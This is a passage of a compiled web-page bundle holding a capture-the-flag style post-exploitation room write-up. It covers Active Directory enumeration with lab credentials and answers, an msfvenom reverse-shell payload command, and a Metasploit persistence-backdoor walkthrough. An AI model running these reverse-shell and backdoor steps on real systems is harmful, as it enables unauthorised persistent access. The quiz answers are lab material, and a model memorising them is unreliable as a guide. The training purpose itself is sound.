a lot of other mischief that you can get your hands on in terms of enumerating with the server manager"),(0,o.kt)("p",null,"This can also be a way of easily identifying what kind of firewall the network is using if you have not already enumerated it."),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Connect to the VM w/ RDP:")),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Your machine IP is 10.10.64.101"),(0,o.kt)("li",{parentName:"ul"},"Username: Administrator"),(0,o.kt)("li",{parentName:"ul"},"Password: P@$$W0rd"),(0,o.kt)("li",{parentName:"ul"},"Domain Name: CONTROLLER")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Enumeration w/ Server Manager -")),(0,o.kt)("p",null,"This is what Windows Server Manager will look when you first open it up the main tabs that will be most interesting are the tools and manage tabs the tools tab is where you will find most of your information such as users, groups, trusts, computers. The manage tab will allow you to add roles and features however this will probably get picked up by a systems admin relatively quick."),(0,o.kt)("p",null,"Dont worry about the AD CS, AD DS, DNS, or File and Storage Services these are setup for exploitation of the active directory and dont have much use for post-exploitation"),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/xk3fAdg.png",alt:null})),(0,o.kt)("p",null,"Navigate to the tools tab and select the Active Directory Users and Computers"),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/LbWxEF5.png",alt:null})),(0,o.kt)("p",null,"This will pull up a list of all users on the domain as well as some other useful tabs to use such as groups and computers"),(0,o.kt)("p",null,"Some sys admins dont realize that you as an attacker can see the descriptions of user accounts so they may set the service accounts passwords inside of the description look into the description and find what the SQL Service password is"),(0,o.kt)("p",null,"What tool allows to view the event logs?"),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(75714).Z,width:"786",height:"552"})),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"Event Viewer")),(0,o.kt)("p",null,"What is the SQL Service password"),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(15777).Z,width:"753",height:"530"})),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"MYpassword123#")),(0,o.kt)("h2",{id:"maintaining-access"},"Maintaining Access"),(0,o.kt)("p",null,"There are a quite a few ways to maintain access on a machine or network we will be covering a fairly simple way of maintaining access by first setting up a meterpreter shell and then using the persistence metasploit module allowing us to create a backdoor service in the system that will give us an instant meterpreter shell if the machine is ever shutdown or reset."),(0,o.kt)("p",null,"There are also other ways of maintaining access such as advanced backdoors and rootkits however those are out of scope for this room."),(0,o.kt)("p",null,"This will require a little more manual setup than the other tasks so it is recommended to have previous knowledge of msfvenom and metasploit."),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Generating a Payload w/ msfvenom")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("inlineCode",{parentName:"li"},"msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe -o shell.exe")," this will generate a basic windows meterpreter reverse tcp shell",(0,o.kt)("ol",{parentName:"li"},(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("img",{parentName:"li",src:"https://i.imgur.com/QMUjy24.png",alt:null})))),(0,o.kt)("li",{parentName:"ol"},"Transfer the payload from your attacker machine to the target machine."),(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("inlineCode",{parentName:"li"},"use exploit/multi/handler")," - this will create a listener on the port that you set it on."),(0,o.kt)("li",{parentName:"ol"},"Configure our payload to be a windows meterpreter shell: ",(0,o.kt)("inlineCode",{parentName:"li"},"set payload windows/meterpreter/reverse_tcp")),(0,o.kt)("li",{parentName:"ol"},'After setting your THM IP address as your "LHOST", start the listener with ',(0,o.kt)("inlineCode",{parentName:"li"},"run")),(0,o.kt)("li",{parentName:"ol"},"Executing the binary on the windows machine will give you a meterpreter shell back on your host - let's return to that"),(0,o.kt)("li",{parentName:"ol"},"Verify that we've got a meterpreter shell, where we will then ",(0,o.kt)("inlineCode",{parentName:"li"},"background")," it to run the persistence module.")),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Run the Persistence Module -")),(0,o.kt)("ol",null,(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("inlineCode",{parentName:"li"},"use exploit/windows/local/persistence")," this module will send a payload every 10 seconds in default however you can set this time to anything you want"),(0,o.kt)("li",{parentName:"ol"},(0,o.kt)("inlineCode",{parentName:"li"},"set session 1")," set the session to the session that we backgrounded in meterpreter (you can use the sessions command in metasploit to list the active sessions)")),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/KxaNZo5.png",alt:null})),(0,o.kt)("p",null,"If the system is shut down or reset for whatever reason you will lose your meterpreter session however by using the persistence module you create a backdoor into the system which you can access at any time using the metasploit multi handler and setting the payload to ",(0,o.kt)("inlineCode",{parentName:"p"},"windows/meterpreter/reverse_tcp")," allowing you to send another meterpreter payload to the machine and open up a new meterpreter session."),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://i.imgur.com/Q6pToA1.png",alt:null})),(0,o.kt)("p",null,"Here you can see the session die however the second we run the handler again we get a meterpreter shell back thanks to the persistence service."),(0,o.kt)("p",null,"There are other ways of maintaining access such as adding users and rootkits however I will leave you to do your own research and labs on those topics."),(0,o.kt)("p",null,"I understand how to install a backdoor on a system using the persistence module"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"No answer needed")),(0,o.kt)("h2",{id:"conclusion"},"Conclusion"),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Final Thoughts -")),(0,o.kt)("p",null,"This room has given a good beginning with post-exploitation however there are a lot of other methods ever-evolving. I suggest to you to go out and do your own research find your own tools that you like to use for post-exploitation. I hope to make another room similar to this covering more advanced topics such as more in-depth backdoors and trojans, pivoting, token impersonation, and silver ticket attacks. I hope that this room has helped to give you a better understanding of how post-exploitation works in a real-world scenario."),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Resources -")),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"https://blog.harmj0y.net/"},"https://blog.harmj0y.net/")),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"https://adsecurity.org/?page_id=1821"},"https://adsecurity.org/?page_id=1821")),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"https://metasploit.help.rapid7.com/docs/about-post-exploitation"},"https://metasploit.help.rapid7.com/docs/about-post-exploitation")),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"http://www.pentest-standard.org/index.php/Post_Exploitation"},"http://www.pentest-standard.org/index.php/Post_Exploitation")),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"https://offsec.red/mimikatz-cheat-sheet/"},"https://offsec.red/mimikatz-cheat-sheet/")),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993"},"https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993"))),(0,o.kt)("p",null,(0,o.kt)("strong",{parentName:"p"},"Tools/Malware Used -")),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"https://github.com/gentilkiwi/mimikatz"},"https://github.com/gentilkiwi/mimikatz")),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1"},"https://github.com/BloodHoundAD/BloodHound/blob/master/Ingestors/SharpHound.ps1")),(0,o.kt)("li",{parentName:"ul"},(0,o.kt)("a",{parentName:"li",href:"https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"},"https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"))),(0,o.kt)("p",null,"I understand the basics of post-exploitation"),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"No answer needed")))}c.isMDXComponent=!0},75714:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/2020-11-21_00-06-212c7fee116f6c6eff6e7aa65e9940c1.png"},15777:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/2020-11-21_00-08-597cac464add4270389d26e4bb69f4cb.png"}}]);